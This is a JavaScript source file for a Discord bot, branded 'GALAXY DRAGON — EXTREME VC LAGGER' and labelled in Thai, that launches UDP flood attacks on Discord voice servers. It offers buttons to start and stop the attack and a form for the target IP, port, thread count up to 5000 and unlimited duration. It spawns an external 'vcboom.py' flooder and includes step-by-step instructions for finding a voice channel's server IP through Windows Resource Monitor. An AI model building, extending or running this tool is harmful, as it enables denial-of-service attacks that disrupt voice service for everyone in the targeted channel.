// index.js
const {
  Client, GatewayIntentBits, EmbedBuilder,
  ActionRowBuilder, ButtonBuilder, ButtonStyle,
  ModalBuilder, TextInputBuilder, TextInputStyle,
} = require('discord.js');
const { spawn } = require('child_process');

const TOKEN = process.env.BOT_TOKEN || '';
let activeAttack = null;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

client.on('ready', () => {
  console.log(`\n[GALAXY DRAGON] SYSTEM ONLINE: ${client.user.tag}`);
});

// ─────────────────────────────────────────
// Commands
// ─────────────────────────────────────────
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  if (message.content === '!vc-extreme') {
    const embed = new EmbedBuilder()
      .setTitle('🔥 GALAXY DRAGON — EXTREME VC LAGGER')
      .setDescription(
        '```css\n' +
          '🎯 TARGET : DISCORD VOICE SERVER\n' +
          'METHOD : UDP EXTREME FLOOD\n' +
          'POWER  : 3,000 THREADS\n' +
          'BUF    : 4 MB per socket\n' +
          'STATUS : WAITING FOR COMMAND...\n' +
        '```'
      )
      .setColor('#FF0000')
      .setFooter({ text: '⚠ การยิงนี้จะทำให้ทุกคนในห้องเสียงปิงพุ่งสูง' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('btn_launch')
        .setLabel('เริ่มการยิง (Extreme)')
        .setStyle(ButtonStyle.Danger)
        .setEmoji('<a:__1394656139098198098:1459793729094291559>'),
      new ButtonBuilder()
        .setCustomId('btn_how_to')
        .setLabel('สอนหาไอพี')
        .setStyle(ButtonStyle.Primary)
        .setEmoji('<a:Alarm_1394254826258436117:1459808885274575042>'),
      new ButtonBuilder()
        .setCustomId('btn_stop')
        .setLabel('หยุดยิง')
        .setStyle(ButtonStyle.Secondary)
        .setEmoji('<a:apLoad_1394253568848166942:1459794423117516912>')
    );

    await message.channel.send({ embeds: [embed], components: [row] });
  }

  if (message.content === '!stop') {
    stopAttack();
    message.reply('🔴 **หยุดการโจมตีทั้งหมดเรียบร้อยแล้ว!**');
  }
});

// ─────────────────────────────────────────
// Interactions
// ─────────────────────────────────────────
client.on('interactionCreate', async (interaction) => {
  if (interaction.isButton()) {
    // เปิด Modal
    if (interaction.customId === 'btn_launch') {
      const modal = new ModalBuilder()
        .setCustomId('modal_launch')
        .setTitle('🚀 ระบุเป้าหมายเพื่อทำให้ปิงค้าง');

      modal.addComponents(
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('ip')
            .setLabel('VOICE SERVER IP')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('162.159.xxx.xxx')
            .setRequired(true)
        ),
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('port')
            .setLabel('PORT (ช่วง 50000+)')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('50001')
            .setRequired(true)
        ),
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('threads')
            .setLabel('THREADS (100–5000)')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('3000')
            .setRequired(false)
        ),
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('duration')
            .setLabel('DURATION (วินาที, 0 = ไม่หยุด)')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('60')
            .setRequired(false)
        )
      );
      return await interaction.showModal(modal);
    }

    // สอนหา IP
    if (interaction.customId === 'btn_how_to') {
      const helpEmbed = new EmbedBuilder()
        .setTitle('🔍 วิธีหา Voice IP และ Port')
        .setDescription(
          '1. เข้าห้องเสียงเป้าหมาย\n' +
            '2. เปิด **Task Manager** (Ctrl+Shift+Esc)\n' +
            '3. ไปที่แท็บ **Performance** > กด **Open Resource Monitor**\n' +
            '4. เลือกแท็บ **Network** > ดูหัวข้อ **Network Connections**\n' +
            '5. หา **Discord.exe** ดูช่อง **Remote Address** และ **Remote Port**\n' +
            '   (ปกติพอร์ตจะอยู่ช่วง 50000–65000)\n' +
            '6. นำเลข IP และ Port นั้นมาใส่ในโมดัล'
        )
        .setColor('#00AAFF');
      return await interaction.reply({ embeds: [helpEmbed], ephemeral: true });
    }

    // หยุด
    if (interaction.customId === 'btn_stop') {
      stopAttack();
      await interaction.reply({ content: '✅ **หยุดการทำงานแล้ว UI กลับสู่สถานะปกติ**', ephemeral: true });
    }
  }

  // Modal submit
  if (interaction.isModalSubmit() && interaction.customId === 'modal_launch') {
    await interaction.deferReply({ ephemeral: true });
    const ip       = interaction.fields.getTextInputValue('ip');
    const port     = interaction.fields.getTextInputValue('port');
    const threads  = interaction.fields.getTextInputValue('threads') || '3000';
    const duration = interaction.fields.getTextInputValue('duration') || '0';

    stopAttack();
    activeAttack = spawn('python3', [
      'vcboom.py',
      ip, port,
      threads, duration,
    ]);

    activeAttack.on('error', (err) => {
      console.error('[VCBOOM] spawn error:', err);
    });
    activeAttack.on('exit', (code, signal) => {
      console.log(`[VCBOOM] exited code=${code} signal=${signal}`);
      activeAttack = null;
    });

    const attackEmbed = new EmbedBuilder()
      .setTitle('🚀 กำลังดำเนินการยิง (Extreme Lag)')
      .setColor('#FF4500')
      .addFields(
        { name: '🌐 IP',         value: `\`${ip}\``,                  inline: true },
        { name: '🔌 PORT',       value: `\`${port}\``,                inline: true },
        { name: '🧵 THREADS',    value: `\`${threads}\``,             inline: true },
        { name: '⏱ DURATION',   value: `\`${duration}s\``,            inline: true },
        { name: '⚡ สถานะ',       value: '`กำลังส่ง UDP Packets ความแรงสูงสุด`', inline: false }
      )
      .setTimestamp();

    await interaction.editReply({ embeds: [attackEmbed] });
  }
});

// ─────────────────────────────────────────
function stopAttack() {
  if (activeAttack) {
    try {
      activeAttack.kill('SIGKILL');
    } catch (e) {
      console.error('kill error:', e);
    }
    activeAttack = null;
  }
}

client.login(TOKEN);